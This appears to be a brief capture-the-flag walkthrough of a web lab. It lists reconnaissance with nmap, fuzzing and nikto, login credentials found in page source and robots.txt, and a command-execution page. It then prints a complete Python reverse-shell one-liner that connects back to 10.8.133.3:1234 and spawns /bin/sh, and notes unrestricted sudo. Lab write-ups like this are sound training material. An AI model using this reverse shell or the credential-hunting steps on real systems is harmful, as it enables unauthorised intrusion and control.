start with nmap

http:

in index page source code found

```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

```

in `robots.txt` found : `Wubbalubbadubdub`

fuff with big list.

nothig interested found

nitko scan.


***

got login.php

log in using above creds. : `R1ckRul3s:Wubbalubbadubdub`

cmd execution functionality:

get rev using python3

```python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.133.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

anyone can run sudo .
